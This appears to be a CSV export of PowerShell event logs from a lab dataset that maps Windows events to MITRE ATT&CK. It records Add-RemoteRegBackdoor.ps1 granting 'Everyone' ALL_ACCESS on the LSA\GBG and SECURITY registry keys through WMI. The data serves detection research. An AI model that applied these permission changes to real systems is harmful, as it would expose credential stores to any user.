Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1090,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(New-Object): \""New-Object\"", ParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\"", ParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Ace\"", ""}]}}"
106,68940,2021-12-09 19:54:03.5562642,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1092,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1092,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Creating the trustee WMI object with user 'Everyone'"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1092,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG] Creating the trustee WMI object with user 'Everyone'\"", ""}]}}"
107,68941,2021-12-09 19:54:03.5562642,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1094,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: New-Object,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1094,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(New-Object): ""New-Object"", ParameterBinding(New-Object): name=""TypeName""; value=""System.Management.ManagementClass"", ParameterBinding(New-Object): name=""ArgumentList""; value=""win32_Trustee"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1094,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(New-Object): \""New-Object\"", ParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\"", ParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Trustee\"", ""}]}}"
108,68942,2021-12-09 19:54:03.5562642,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1096,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1096,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Applying Trustee to new Ace"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1096,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG] Applying Trustee to new Ace\"", ""}]}}"
109,68943,2021-12-09 19:54:03.5718942,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1098,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1098,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Calling SetSecurityDescriptor on the key with the newly created Ace"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1098,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG] Calling SetSecurityDescriptor on the key with the newly created Ace\"", ""}]}}"
110,68944,2021-12-09 19:54:03.5718942,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1100,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1100,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Backdooring completed for key"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1100,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG] Backdooring completed for key\"", ""}]}}"
111,68945,2021-12-09 19:54:03.5718942,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1102,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1102,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SECURITY] Backdooring started for key"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1102,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SECURITY] Backdooring started for key\"", ""}]}}"
112,68946,2021-12-09 19:54:03.5718942,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1104,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1104,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SECURITY] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1104,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SECURITY] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\"", ""}]}}"
113,68947,2021-12-09 19:54:03.5718942,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1106,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: New-Object,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1106,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(New-Object): ""New-Object"", ParameterBinding(New-Object): name=""TypeName""; value=""System.Management.ManagementClass"", ParameterBinding(New-Object): name=""ArgumentList""; value=""win32_Ace"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1106,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(New-Object): \""New-Object\"", ParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\"", ParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Ace\"", ""}]}}"
114,68948,2021-12-09 19:54:03.5875149,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1108,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1108,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SECURITY] Creating the trustee WMI object with user 'Everyone'"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1108,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SECURITY] Creating the trustee WMI object with user 'Everyone'\"", ""}]}}"
115,68949,2021-12-09 19:54:03.5875149,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1110,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: New-Object,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1110,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(New-Object): ""New-Object"", ParameterBinding(New-Object): name=""TypeName""; value=""System.Management.ManagementClass"", ParameterBinding(New-Object): name=""ArgumentList""; value=""win32_Trustee"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1110,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(New-Object): \""New-Object\"", ParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\"", ParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Trustee\"", ""}]}}"
